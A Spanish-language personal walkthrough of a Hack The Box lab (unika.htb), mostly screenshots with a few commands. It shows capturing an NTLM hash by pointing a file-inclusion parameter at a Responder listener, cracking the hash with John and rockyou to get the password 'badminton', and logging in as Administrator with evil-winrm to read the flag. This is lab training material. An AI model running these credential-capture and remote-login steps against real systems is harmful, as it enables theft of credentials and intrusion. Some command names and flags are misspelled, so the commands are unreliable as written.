![[Pasted image 20260126190627.png]]

buscamos en el browser la ip para responder a la primera pregunta
![[Pasted image 20260126191201.png]]


![[Pasted image 20260126191900.png]]

```bash
curl -I http://10.129.95.234

```
![[Pasted image 20260126191847.png]]
El problema es que la IP nos redirige al host unika.htb

![[Pasted image 20260126193459.png]]

```bash
sudo su
echo "ip unika.htb" >> /etc/hosts
nano /etc/hosts
```

Y ahora si podemos ver la url:
![[Pasted image 20260126193338.png]]
![[Pasted image 20260126194153.png]]


![[Pasted image 20260126194146.png]]

![[Pasted image 20260126194608.png]]

Task 6:
```bash
respoder --help 
```

- Sirve para capturar hashes NTLM, ataques LLMNR/NBT-NS, etc.
    
- Muy común en laboratorios de Active Directory.

RESPUESTA : 
![[Pasted image 20260126194801.png]]

![[Pasted image 20260126194847.png]]

```bash
ip a
#tun0 buscamos la ip de htb
sudo responder -I tun0 -v

luego en el broser ponemos en page=/ip/somefile

y revisamos el responder que nos ofrecera un hash

nano hash # copiamos el hash
sudo jhon --wordlists=/usr/share/wordlists/rockyou.txt hash

y vemos la password badminton
```
![[Pasted image 20260126195234.png]]

```bash
nmap -p- ... 
y vemos el puerto tcp
```
![[Pasted image 20260126195325.png]]

para conseguir la flag bamos a:
```bash
sudo evil-winrm -u Admistrator -p badminton -i ip
```
ahora estamos usando un powershell
ls
cd ../..
ls
cd mike
ls
cd Desktop
ls
cat flag.txt
